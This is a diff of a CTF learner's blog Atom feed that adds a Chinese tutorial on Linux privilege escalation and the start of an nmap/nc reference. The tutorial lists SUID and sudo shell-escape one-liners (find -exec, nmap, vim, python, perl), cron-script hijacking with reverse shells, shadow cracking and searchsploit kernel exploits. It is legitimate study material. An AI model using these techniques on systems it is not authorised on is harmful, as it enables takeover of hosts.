@@ -1,23 +1,361 @@
 <?xml version="1.0"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ctf-learner.github.io</id>
-    <title> </title>
+    <title>Glad to see U (◦˙▽˙◦)</title>
     <subtitle>Never hack for profit</subtitle>
     <icon>https://ctf-learner.github.io/assets/favicon.ico</icon>
     <link href="https://ctf-learner.github.io" />
     <author>
       <name>MorIo24</name>
     </author>
-    <updated>2024-04-14T04:40:23.000Z</updated>
+    <updated>2024-04-15T14:35:32.000Z</updated>
     <category term="CTF" />
     <category term="web" />
     <category term="bypass" />
     <category term="AWD" />
     <category term="" />
     <entry>
-        <id>https://ctf-learner.github.io/20240414AWD%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
+        <id>https://ctf-learner.github.io/post/Linux%E6%8F%90%E6%9D%83%E6%96%B0%E6%89%8B%E6%9D%91/</id>
+        <title>Linux提权新手村</title>
+        <link rel="alternate" href="https://ctf-learner.github.io/post/Linux%E6%8F%90%E6%9D%83%E6%96%B0%E6%89%8B%E6%9D%91/"/>
+        <content type="html">&lt;p&gt;前记：在许多次 web-Bypass 后， &lt;code&gt;cat /flag&lt;/code&gt;  却没有任何回显，总是被脚本的权限所困扰，然后就有了这篇文章，以借鉴为主，之后在实践中尝试、学习&lt;/p&gt;
+&lt;h1 id=&#34;linux提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux提权&#34;&gt;#&lt;/a&gt; Linux 提权&lt;/h1&gt;
+&lt;h2 id=&#34;suid与sudo提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#suid与sudo提权&#34;&gt;#&lt;/a&gt; SUID 与 sudo 提权&lt;/h2&gt;
+&lt;p&gt;简单了解什么是 suid：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;SUID 是 Set User ID（设置用户标识）的缩写。当一个可执行文件被设置了 SUID 位时，它将在执行时拥有该文件所有者的权限。这意味着，无论谁执行这个文件，它都会以文件所有者的权限运行，而不是执行者自己的权限。&lt;br /&gt;
+SUID 位的主要用途是允许普通用户执行一些需要特权权限的程序，而无需提升到超级用户（root）身份。例如， &lt;code&gt;passwd&lt;/code&gt;  命令通常需要 root 权限才能修改用户密码文件，但是如果  &lt;code&gt;passwd&lt;/code&gt;  程序被设置了 SUID 位，并且拥有 root 所有者，则普通用户也可以通过运行  &lt;code&gt;passwd&lt;/code&gt;  命令来修改自己的密码，因为在执行时  &lt;code&gt;passwd&lt;/code&gt;  程序将以 root 权限运行。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;遍历目录中的suid文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#遍历目录中的suid文件&#34;&gt;#&lt;/a&gt; 遍历目录中的 suid 文件&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null  &lt;span class=&#34;token comment&#34;&gt;# 得到所有 suid 文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;用sudo &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; 查看哪些命令能被sudo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/04/13/sltUpViX5dxjFoG.png&#34; alt=&#34;suid文件.png&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;nmap交互模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap交互模式&#34;&gt;#&lt;/a&gt; nmap 交互模式&lt;/h3&gt;
+&lt;p&gt;nmap 5.20（使用 ``nmap -v &lt;code&gt;查看nmap版本）之前有一个&lt;/code&gt;  interactive &lt;code&gt;交互模式，在&lt;/code&gt;  nmap effective uid=0` 时，可以通过这个模式获得 root 权限交互式命令行&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;--interactive&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 通杀版：&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;os.execute(&#39;/bin/bash&#39;)&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; ./shell&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;--script&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;shell&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;find&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#find&#34;&gt;#&lt;/a&gt; find&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;command&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; /bin/bash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;find 命令自带 - exec 参数，可以执行命令，若 find 有 suid 权限，那么使用 exec 相当于直接提权到 root.&lt;/p&gt;
+&lt;h3 id=&#34;vim&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vim&#34;&gt;#&lt;/a&gt; vim&lt;/h3&gt;
+&lt;p&gt;vim 进入编辑时，使用 &lt;code&gt;:!shell&lt;/code&gt;  进入 shell 交互模式&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;同理： &lt;code&gt;man&lt;/code&gt; 、 &lt;code&gt;git、&lt;/code&gt;   &lt;code&gt;config&lt;/code&gt;  、 &lt;code&gt;help&lt;/code&gt; 、 &lt;code&gt;more&lt;/code&gt; 、 &lt;code&gt;less&lt;/code&gt; 、 &lt;code&gt;vim&lt;/code&gt; 、 &lt;code&gt;vi&lt;/code&gt; 、 &lt;code&gt;ftp&lt;/code&gt; 、 &lt;code&gt;gdb&lt;/code&gt;  等命令都有自己的 shell，我们只需在他们各自的 shell 中执行 ``/bin/sh &lt;code&gt;即可 一般都是在shell键入&lt;/code&gt; :!/bin/sh` 来 bypass rbash&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash&#34;&gt;#&lt;/a&gt; bash&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt;  开启一个新root shell，前提是uid&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;exim&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exim&#34;&gt;#&lt;/a&gt; exim&lt;/h3&gt;
+&lt;p&gt;exim 在特定版本下会有 suid 提权，可以通过&lt;a href=&#34;&#34;&gt; searchsploit 查看&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rbash提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rbash提权&#34;&gt;#&lt;/a&gt; rbash 提权&lt;/h3&gt;
+&lt;p&gt;具体看&lt;a href=&#34;http://t.csdnimg.cn/EIwvy&#34;&gt;这篇文章&lt;/a&gt;，往后遇到回来补习&lt;/p&gt;
+&lt;h3 id=&#34;python提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python提权&#34;&gt;#&lt;/a&gt; python 提权&lt;/h3&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;c &lt;span class=&#34;token string&#34;&gt;&#34;import os;os.system(&#39;/bin/bash&#39;)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;php-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-shell&#34;&gt;#&lt;/a&gt; php shell&lt;/h3&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;a 进入php shell&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;执行命令&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/bin/bash&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;perl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#perl&#34;&gt;#&lt;/a&gt; perl&lt;/h3&gt;
+&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption data-lang=&#34;perl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;perl &lt;span class=&#34;token operator&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;exec &#34;/bin/sh&#34;;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;ruby&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ruby&#34;&gt;#&lt;/a&gt; ruby&lt;/h3&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ruby &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;e &lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;exec &#34;/bin/bash&#34;&#39;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;cp复制命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cp复制命令&#34;&gt;#&lt;/a&gt; cp 复制命令&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cp&lt;/span&gt; /bin/bash/* &lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;# 复制 /bin/bash 下所有命令到当前目录&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;爆破shadow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆破shadow&#34;&gt;#&lt;/a&gt; 爆破 shadow&lt;/h3&gt;
+&lt;p&gt;/etc/passwd 默认所有用户可读，但只有 root 可写。 /etc/passwd 里的用户口令往往以 x 代替，其加密后的密码会存入 /etc/shadow 里面，/etc/shadow 默认只有 root 可读。如果 /etc/shadow 可读，我们可以用 hashcat 或者 john 暴力破解 shadow 文件，&lt;/p&gt;
+&lt;h3 id=&#34;文件重写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件重写&#34;&gt;#&lt;/a&gt; 文件重写&lt;/h3&gt;
+&lt;p&gt;计划任务由 crontab 管理，非 root 用户是无法列出 root 用户的计划任务的，但我们可以列出 /etc 的系统任务，系统任务默认是 root 权限运行的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-纯文本&#34;&gt;ls -l /etc/cron*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹 shell 等指令，从而提权&lt;/p&gt;
+&lt;h3 id=&#34;环境变量劫持&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境变量劫持&#34;&gt;#&lt;/a&gt; 环境变量劫持&lt;/h3&gt;
+&lt;p&gt;利用 LD_PRELOAD 优先加载指定的共享库文件，劫持系统命令&lt;/p&gt;
+&lt;p&gt;细读 p 神文章：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://tttang.com/archive/1450/&#34;&gt;我是如何利用环境变量注入执行任意命令 - 跳跳糖 (tttang.com)&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;利用通配符提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用通配符提权&#34;&gt;#&lt;/a&gt; 利用通配符提权&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.secpulse.com/archives/72965.html&#34;&gt;利用通配符实现 Linux 本地提权 - SecPulse.COM | 安全脉搏&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;linux-内核提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux-内核提权&#34;&gt;#&lt;/a&gt; Linux 内核提权&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;苯人 web 选手学不会 pwn 那么多原理，只会用 exp 照着 cve 的 wp 直接打&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;查看linux操作系统的内核版本和相关信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看linux操作系统的内核版本和相关信息&#34;&gt;#&lt;/a&gt; 查看 Linux 操作系统的内核版本和相关信息&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; /etc/issue  &lt;span class=&#34;token comment&#34;&gt;# 查看 ubuntu 或者 centos 的版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; /etc/*-release &lt;span class=&#34;token comment&#34;&gt;# 查看 centos 版本&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;uname&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 查看系统全部信息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;uname&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 查看内核版本 -- 比较重要&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/04/13/g5nCthcxv8WEPBr.png&#34; alt=&#34;Linux 3.10.0.png&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;searchsploit离线工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#searchsploit离线工具&#34;&gt;#&lt;/a&gt; searchsploit 离线工具&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;ul class=&#34;lvl-1&#34;&gt;
+&lt;li class=&#34;lvl-2&#34;&gt;
+&lt;p&gt;“searchsploit” 是一个用于 Exploit-DB 的命令行搜索工具，它还允许你随身带一份 Exploit-DB 的副本。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li class=&#34;lvl-2&#34;&gt;
+&lt;p&gt;SearchSploit 提供了在本地保存的存储库中执行详细的离线搜索的能力。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li class=&#34;lvl-2&#34;&gt;
+&lt;p&gt;许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在 Exploit-DB 二进制文件中找到。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;开赛前，请记得&lt;strong&gt;更新 searchsploit&lt;/strong&gt;！&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;apt&lt;/span&gt; update &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;apt&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-y&lt;/span&gt; full-upgrade&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;searchsploit &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;details open&gt;
+&lt;summary&gt;&lt;span class=&#34;pre-summary&#34;&gt;&amp;nbsp;&lt;/span&gt;&lt;mark&gt;使用 tips，点击打开&lt;/mark&gt;&lt;/summary&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;选项&lt;/th&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;功能&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;例如&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-t&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;仅对标题搜索&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;searchsploit -t smb windows remote&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;--exclude&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;选项删除不想要的结果&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;searchsploit smb windows remote --exclude=&amp;quot;(POC)|txt&amp;quot;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-p&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;复制到剪切板&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;searchsploit -p 42315.py&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-m&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;复制到当前工作目录&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;searchsploit -m 42315.py&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-w&lt;/td&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;联网搜索&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;searchsploit -w smb windows remote&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/details&gt;
+&lt;p&gt;searchsploit 后面可以填入多个搜索关键词&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchsploit [keywords1] [keywords2] ...&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注意：SearchSploit 使用 AND 运算符，而不是 OR 运算符。使用的术语越多，滤除的结果越多。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;searchsploit -m 50135.c&lt;/code&gt; &lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://s2.loli.net/2024/04/13/vIKTHaJA59FWVBq.png&#34; alt=&#34;Ubuntu18.04.6.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-m 选项同时可以获取该 poc 的 cve 信息，直接搜索引擎复现提权&lt;/strong&gt;&lt;br /&gt;
+ searchsploit 获取的 poc 需要&lt;strong&gt;上传 Linux 后编译&lt;/strong&gt;，而不能在 kali 中编译&lt;br /&gt;
+ &lt;code&gt;gcc -o test 50808.c&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;note warning&#34;&gt;
+&lt;p&gt;具体流程大概这样，具体提权的方法因靶机而异&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接：&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://const27.com/&#34;&gt;https://const27.com/&lt;/a&gt;&lt;/p&gt;
+</content>
+        <updated>2024-04-15T14:35:32.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://ctf-learner.github.io/post/%E4%B8%8D%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8/</id>
+        <title>nc&amp;nmap</title>
+        <link rel="alternate" href="https://ctf-learner.github.io/post/%E4%B8%8D%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8/"/>
+        <content type="html">&lt;h1 id=&#34;nmap-nc命令学习&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap-nc命令学习&#34;&gt;#&lt;/a&gt; nmap、nc 命令学习&lt;/h1&gt;
+&lt;h2 id=&#34;namp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#namp&#34;&gt;#&lt;/a&gt; namp&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Scan Type&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Options&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;target specification&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;目标说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标说明&#34;&gt;#&lt;/a&gt; 目标说明&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ip/&amp;lt;numbit&amp;gt;: Nmap 将会扫描所有和该参考 IP 地址具有 &amp;lt;numbit &amp;gt; 相同比特的所有 IP 地址或主机.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例如，192.168.10.0/24 将会扫描 192.168.10.0 和 192.168.10.255 之间的 256 台主机。192.168.10.40/24 将会做同样的事情。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;主机发现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主机发现&#34;&gt;#&lt;/a&gt; 主机发现&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;选项&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-iL &amp;lt;inputfilename&amp;gt;&lt;/td&gt;
+&lt;td&gt;从文件中输入&lt;/td&gt;
+&lt;td&gt;--excludefile &amp;lt;excludefile&amp;gt; 同理&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;--exclude &amp;lt;host1[，host2][，host3]，...&amp;gt;&lt;/td&gt;
+&lt;td&gt;排除主机 / 网络&lt;/td&gt;
+&lt;td&gt;以逗号分隔的列表排除它们&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sL&lt;/td&gt;
+&lt;td&gt;列表扫描&lt;/td&gt;
+&lt;td&gt;仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sP&lt;/td&gt;
+&lt;td&gt;Ping 扫描&lt;/td&gt;
+&lt;td&gt;进行 ping 扫描，打印出对扫描做出响应的主机&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-P0&lt;/td&gt;
+&lt;td&gt;无 ping&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;不用域名解析&lt;/td&gt;
+&lt;td&gt;不对它发现的活动 IP 地址进行反向域名解析&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
